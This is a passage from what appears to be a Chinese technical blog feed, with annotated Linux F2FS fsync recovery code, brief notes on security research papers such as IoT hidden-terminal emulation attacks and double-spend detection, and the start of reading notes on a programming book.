<span class="comment">// inode最后一次修改时间</span></span><br><span class="line">    inode-&gt;i_mtime.tv_sec = le32_to_cpu(raw_inode-&gt;i_mtime); <span class="comment">// 文件最后一次修改时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> recover_dentry(node_page, inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode"><a href="#find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode" class="headerlink" title="find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode"></a>find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">find_fsync_dnodes</span><span class="params">(struct f2fs_sb_info *sbi, struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);<span class="comment">// cp版本</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取当前段的节点页面</span></span><br><span class="line"><span class="comment">     * CURSEG_I因为是基于dnode进行恢复，因此是WARM NODE</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, CURSEG_WARM_NODE);</span><br><span class="line">    blkaddr = START_BLOCK(sbi, curseg-&gt;segno) + curseg-&gt;next_blkoff;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读页面 */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(page);</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page)) <span class="comment">// 比较从cp版本</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_fsync_dnode(page)) <span class="comment">// 前滚恢复只能恢复被fsync的node page</span></span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果是NULL，则表示inode不在list中</span></span><br><span class="line"><span class="comment">         * 如不是NULL，则表示这个inode已经在list中，不需要加入了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">            <span class="keyword">if</span> (entry) &#123;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">                <span class="comment">// 如果是dentry的inode，则先恢复</span></span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page))</span><br><span class="line">                    set_inode_flag(F2FS_I(entry-&gt;inode),</span><br><span class="line">                                            FI_INC_LINK);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (recover_inode_page(sbi, page)) &#123;</span><br><span class="line">                        err = -ENOMEM;</span><br><span class="line">                        <span class="keyword">goto</span> out;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* add this fsync inode to the list */</span></span><br><span class="line">                entry = kmem_cache_alloc(fsync_entry_slab, GFP_NOFS);</span><br><span class="line">                <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">                    err = -ENOMEM;</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                INIT_LIST_HEAD(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">                list_add_tail(&amp;entry-&gt;<span class="built_in">list</span>, head);</span><br><span class="line"></span><br><span class="line">                entry-&gt;inode = f2fs_iget(sbi-&gt;sb, ino_of_node(page));</span><br><span class="line">                <span class="keyword">if</span> (IS_ERR(entry-&gt;inode)) &#123;</span><br><span class="line">                    err = PTR_ERR(entry-&gt;inode);</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (IS_INODE(page)) &#123;</span><br><span class="line">                err = recover_inode(entry-&gt;inode, page);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">next:</span><br><span class="line">            <span class="comment">/* check next segment */</span></span><br><span class="line">            blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">            ClearPageUptodate(page);</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="destroy-fsync-dnodes-销毁fsync-dnodes"><a href="#destroy-fsync-dnodes-销毁fsync-dnodes" class="headerlink" title="destroy_fsync_dnodes // 销毁fsync dnodes"></a>destroy_fsync_dnodes // 销毁fsync dnodes</h3><h3 id="check-index-in-prev-nodes-检查前向节点的索引"><a href="#check-index-in-prev-nodes-检查前向节点的索引" class="headerlink" title="check_index_in_prev_nodes // 检查前向节点的索引"></a>check_index_in_prev_nodes // 检查前向节点的索引</h3><h3 id="do-recover-data-恢复data-page和node-page"><a href="#do-recover-data-恢复data-page和node-page" class="headerlink" title="do_recover_data // 恢复data page和node page"></a>do_recover_data // 恢复data page和node page</h3><blockquote>
<p>首先调用<code>start_bidx_of_node</code>函数，把当前node page的起始块索引赋给start<br><code>set_new_dnode</code>建立一个vfs dnode，<code>get_dnode_of_data</code>初始化刚刚建立的dnode相关信息。<br><code>wait_on_page_writeback</code>等待页面回写<br><code>get_node_info</code>从node page获取节点信息<br><code>datablock_addr</code>获取文件名和索引<br><code>check_index_in_prev_nodes</code>检查具有以上获取的索引的前向节点<br>通过调用<code>recover_data_page</code>和<code>update_extent_cache</code>写入虚拟数据页<br>调用<code>recover_node_page</code>恢复node page</p>
</blockquote>
<h3 id="recover-data-恢复数据"><a href="#recover-data-恢复数据" class="headerlink" title="recover_data // 恢复数据"></a>recover_data // 恢复数据</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_data</span><span class="params">(struct f2fs_sb_info *sbi,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct list_head *head, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get node pages in the current segment */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, type);</span><br><span class="line">    blkaddr = NEXT_FREE_BLKADDR(sbi, curseg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read node page */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从inodelist中取出一个entry</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">        <span class="keyword">if</span> (!entry)</span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行恢复</span></span><br><span class="line">        do_recover_data(sbi, entry-&gt;inode, page, blkaddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;blkaddr == blkaddr) &#123;</span><br><span class="line">            iput(entry-&gt;inode);</span><br><span class="line">            list_del(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">            kmem_cache_free(fsync_entry_slab, entry);</span><br><span class="line">        &#125;</span><br><span class="line">next:</span><br><span class="line">        <span class="comment">/* check next segment */</span></span><br><span class="line">        blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">        ClearPageUptodate(page);</span><br><span class="line">        &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    allocate_new_segments(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-fsync-data-恢复fsync数据"><a href="#recover-fsync-data-恢复fsync数据" class="headerlink" title="recover_fsync_data // 恢复fsync数据"></a>recover_fsync_data // 恢复fsync数据</h3><p>①首先通过<code>find_fsync_dnodes</code>函数找到所有的可以恢复的dnode对应的inode(有可能dnode就是inode本身)，放入到一个list中。  </p>
<blockquote>
<p><code>find_fsync_dnodes</code>的执行流程：通过调用<code>CURSEG_I</code>和<code>START_BLOCK</code>函数获取当前段（segment）的node pages，再调用alloc_page读取node pages，把可恢复的dnode对应的inode添加到list中，再检查下个段（segment）。  </p>
</blockquote>
<p>②恢复数据：恢复inode list里面的所有的node page</p>
]]></content>
      <categories>
        <category>内核</category>
      </categories>
      <tags>
        <tag>Linux内核</tag>
        <tag>F2FS</tag>
      </tags>
  </entry>
  <entry>
    <title>A multi-flow information flow tracking approach for proving quantitative hardware security properties</title>
    <url>/2020/09/03/A-multi-flow-information-flow-tracking-approach/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>hardware security; Information Flow Tracking (IFT); multi-flow IFT; security property</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/03/A-multi-flow-information-flow-tracking-approach/image-20210524202126427.png" alt="image-20210524202126427"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/9121656">https://ieeexplore.ieee.org/document/9121656</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>信息流跟踪</tag>
        <tag>硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Securing Data With Blockchain and AI</title>
    <url>/2020/09/14/With-Blockchain-and-AI/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Data security, data systems, artificial intelligence, cyberspace</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/14/With-Blockchain-and-AI/image-20210524204351643.png" alt="image-20210524204351643"></p>
<ul>
<li>CPS：Cyber Physical Social 信息物理社会融合系统</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8733072">https://ieeexplore.ieee.org/document/8733072</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>基于多目标进化算法的变密度模糊认知图学习</title>
    <url>/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Densities, fuzzy cognitive maps, multiobjective evolutionary algorithms (MOEAs), multiobjective optimization problems (MOP)</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/image-20210524203330315.png" alt="image-20210524203330315"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/7094248">https://ieeexplore.ieee.org/document/7094248</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>FCM</tag>
        <tag>多目标优化MOP</tag>
      </tags>
  </entry>
  <entry>
    <title>A Practical Approach to Constructing a Knowledge Graph for Cybersecurity</title>
    <url>/2020/09/07/Knowledge-Graph-for-Cybersecurity/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Cybersecurity; Knowledge graph; Knowledge deduction</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/07/Knowledge-Graph-for-Cybersecurity/image-20210524202713003.png" alt="image-20210524202713003"></p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S2095809918301097">https://www.sciencedirect.com/science/article/pii/S2095809918301097</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>基于增量式GHSOM神经网络模型的入侵检测研究</title>
    <url>/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>增量式学习; 生长型分层自组织映射; 入侵检测; 神经网络; 信息安全; 网络安全</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>GHSOM (Growing Hierarchical Self-Organizing Maps)：生长型分层自组织映射</li>
</ul>
<p><img src="/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20210524205136903.png" alt="image-20210524205136903"></p>
<h3 id="增量式学习"><a href="#增量式学习" class="headerlink" title="增量式学习"></a>增量式学习</h3><ol>
<li>不断学习新样本</li>
<li>保留大部分以前学到的知识</li>
<li>渐进修正/增强以前学过的知识</li>
<li>更新后的知识可以适应更新后的数据，不必重新学习</li>
<li>降低了时间、空间需求</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title>面向智能终端的快捷支付双花攻击检测模型</title>
    <url>/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>数字加密货币; 安全交易; 双花攻击; 人工免疫; 异常检测</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><h3 id="51-攻击"><a href="#51-攻击" class="headerlink" title="51% 攻击"></a>51% 攻击</h3><ul>
<li>指攻击者利用算力优势（大于50%）强行修改 合法的交易记录，实现一笔虚拟货币两次消费</li>
<li>对于比特币交易而言，每个用户节点都可参与交易的合法性验证和确认。</li>
<li>参与交易的节点就是矿工节点，他们用CPU计算资源进行挖矿（利用CPU资源计算随机数），通过工作量证明（POW）机制进行账单记录权的争夺，胜利者将得到一份比特币作为奖励。</li>
</ul>
<h4 id="攻击条件说明"><a href="#攻击条件说明" class="headerlink" title="攻击条件说明"></a>攻击条件说明</h4><p>条件一：根据比特币协议，后到的同源交易将被丢弃</p>
<p>条件三：因为比特币用户是匿名的，而且一个 用户可拥有多个账号，所以当服务结束了，即使卖 主意识到了异常，也很难鉴别出攻击者，导致双花 攻击的可能性增大。</p>
<h3 id="预防双花攻击"><a href="#预防双花攻击" class="headerlink" title="预防双花攻击"></a>预防双花攻击</h3><p>以比特币为代表的主流数字加密货币，通过工作量证明的机制和一个记录所有确认交易的公共链来预防双花攻击</p>
<h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>根据比特币白皮书中的说明可知，比特币网络以交易时间为代价来累积确认交易区块的高度从而对抗双花攻击。</p>
<p><img src="/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/image-20210524205529138.png" alt="image-20210524205529138"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>免疫</tag>
        <tag>异常检测</tag>
      </tags>
  </entry>
  <entry>
    <title>Third Eye Context-Aware Detection for Hidden Terminal Emulation Attacks in Cognitive Radio-Enabled IoT Networks</title>
    <url>/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>IoT security, context-aware detection, Markov chain, hidden Markov model</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>IoT  Internet of Things  物联网</li>
<li>认知无线电 Cognitive Radio<ul>
<li>具有学习能力，能与周围环境交互信息，以感知和利用在该空间的可用频谱，并限制和降低冲突的发生。</li>
</ul>
</li>
<li>hidden terminal emulation  隐藏终端仿真</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/image-20210524210542892.png" alt="image-20210524210542892"></p>
<h3 id="HTE-攻击"><a href="#HTE-攻击" class="headerlink" title="HTE 攻击"></a>HTE 攻击</h3><ul>
<li><p><strong>方法概要：</strong>攻击者利用天线辐射方向图来模拟隐藏终端(位置伪造攻击的一种形式)。  </p>
</li>
<li><p><strong>攻击前提：</strong>在先前的工作中，位置伪造被认为是一个本地化问题，锚设备（专门用于定位任何设备的设备）在检测位置伪造攻击中起着重要的作用。但是在大多数物联网应用中，物联网设备不可能配备复杂的本地化功能，在密集的IoT网络中部署锚设备也不现实。因此，在密集的物联网场景中，现成的位置欺骗检测方法不适用。  </p>
</li>
<li><p><strong>攻击过程：</strong></p>
<ul>
<li>攻击者通过wardriving等现有技术获取IoT设备的位置（角度、距离等）</li>
<li>然后根据攻击者的目标或者物理限制，攻击者可能会尝试将其作为被攻击者的所有邻居或者选定邻居的隐藏终端</li>
<li>HTE攻击者在此阶段的主要任务是成功模拟受害者附近的隐藏终端的辐射特性。  </li>
</ul>
</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/00%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB.png" alt="00隐藏终端仿真攻击"></p>
<p>图a中，攻击者试图将自己伪装成节点A1，A3，A5的隐藏终端，它们只对A2，A4，A6传输。天线的智能利用使攻击者能够仿真不同的物理场景，如图b，即仿真阶段。 </p>
<p>在此阶段，HTE攻击者继续通过宽带感知来感测工作频带，并分别嗅探发往或发自受害节点的RTS和CTS消息的频带。它试图故意干扰从节点A1，A3和A5发送到受害节点（即A4）的传输。但是，干扰率的选择取决于攻击者的策略。它可能会干扰每次传输，随机干扰或在良性或恶意行为之间采取间歇性策略。在本文中，我们讨论了这些不同的攻击策略，以及它们针对上下文感知的HTE检测方法保持免疫力的能力。这种检测技术将创建一个上下文模型，以区分良性和恶意行为。因此，攻击者将尝试紧密模仿良性模型的行为，以使其未被检测到，但保持其攻击性能。我们认为攻击者（即HTE-1）采取了一种微妙的随机方法，即通过与其自身网络（即HTE-2）中的邻居继续进行常规通信，将其伪装成合法节点，并且攻击者会智能地干扰仅在攻击者闲置时（即未与HTE-2通信）接收受害者的信息。因此，与常规的反应式干扰攻击相比，它提供了不同的检测挑战。</p>
<ul>
<li><strong>攻击结果：</strong>干扰特定的传输  </li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8964452">https://ieeexplore.ieee.org/document/8964452</a></p>
<h2 id="Oth"><a href="#Oth" class="headerlink" title="Oth"></a>Oth</h2><h3 id="针对移动终端的攻击方式"><a href="#针对移动终端的攻击方式" class="headerlink" title="针对移动终端的攻击方式"></a>针对移动终端的攻击方式</h3><ul>
<li><p>中间人攻击拦截网络流量</p>
</li>
<li><p>通过操作系统的安全漏洞或者硬件漏洞进行攻击</p>
</li>
<li><p>在应用中植入恶意代码</p>
<ul>
<li>BOptions sideloading技术<ul>
<li><a href="https://zhuanlan.zhihu.com/p/40203178">BOption侧载机制</a> </li>
<li><a href="https://www.securityweek.com/attackers-target-iphones-using-open-source-mdm-solution">其他参考</a>  </li>
<li>向合法应用程序中添加恶意代码，目的是在应用程序中注入动态库。  </li>
<li>这些插入应用程序的恶意代码能够收集并盗窃设备中的信息，如电话号码、序列号、位置、联系人、用户照片、短信、邮件、WhatsApp聊天消息等，攻击者可以利用这些信息要挟受害者或实施另外的攻击。  </li>
<li>在设备上安装附加证书以允许远程管理操作的过程中可能会导致潜在的恶意活动。</li>
</ul>
</li>
</ul>
</li>
<li><p>针对电源的Bad Power攻击</p>
</li>
</ul>
<h3 id="针对PC系统"><a href="#针对PC系统" class="headerlink" title="针对PC系统"></a>针对PC系统</h3><ul>
<li>针对打印机的APT攻击<ul>
<li><a href="https://www.freebuf.com/articles/terminal/92482.html">打印机APT攻击</a>  通过LDAP提取Windows Active Directory的证书或者滥用“扫描文件”和“扫描电子邮件”功能  </li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>HTE攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>程序员的自我修养</title>
    <url>/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
    <content><![CDATA[<h2 id="第一部分-简介"><a href="#第一部分-简介" class="headerlink" title="第一部分 简介"></a>第一部分 简介</h2><h2 id="第一章-温故而知新"><a href="#第一章-温故而知新" class="headerlink" title="第一章 温故而知新"></a>第一章 温故而知新</h2><h3 id="硬件结构相关"><a href="#硬件结构相关" class="headerlink" title="硬件结构相关"></a>硬件结构相关</h3><ul>
<li><strong>计算机的核心：</strong> CPU，内存，I/O控制芯片</li>
<li><strong>北桥</strong>芯片 （PCI Bridge） 协调高速设备 连接CPU，内存，PCI总线<br><strong>南桥</strong>芯片 （ISA Bridge） 专门处理低速设备，汇总后连接到北桥</li>
</ul>
<h3 id="SMP与多核"><a href="#SMP与多核" class="headerlink" title="SMP与多核"></a>SMP与多核</h3><ul>
<li><strong>对称多处理器</strong>（SMP，Symmetrical Mutil-Processing）： 每个CPU在系统中的地位和功能一样，是相互对称的。理想情况下，速度的提高与CPU数量成正比，但实际上不能。因为不是所有的程序都能分解成若干个完全不相关的子问题。</li>
<li><strong>多核处理器</strong> 实际上就是SMP的简化版</li>
</ul>
<h3 id="计算机软件体系结构"><a href="#计算机软件体系结构" class="headerlink" title="计算机软件体系结构"></a>计算机软件体系结构</h3><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361932769-448f5299-a31f-4b78-9012-f5f722765353.png"><br>接口的上层：使用者<br>接口的下层：提供者</p>
<h3 id="操作系统的功能"><a href="#操作系统的功能" class="headerlink" title="操作系统的功能"></a>操作系统的功能</h3><p>在CSAPP中也有提到，这里更加简练</p>
<ol>
<li>提供抽象的接口</li>
<li>管理硬件资源</li>
</ol>
<h3 id="虚拟地址空间"><a href="#虚拟地址空间" class="headerlink" title="虚拟地址空间"></a>虚拟地址空间</h3><p>简单的内存分配策略存在问题：</p>
<ol>
<li>地址空间不隔离</li>
<li>内存使用效率低</li>
<li>程序运行的地址不确定</li>
</ol>
<p>所以用一种间接的地址访问方法：虚拟地址<br><strong>目的：</strong> 保证程序能访问的物理内存区域与另外的程序不重叠（也即 地址空间隔离）</p>
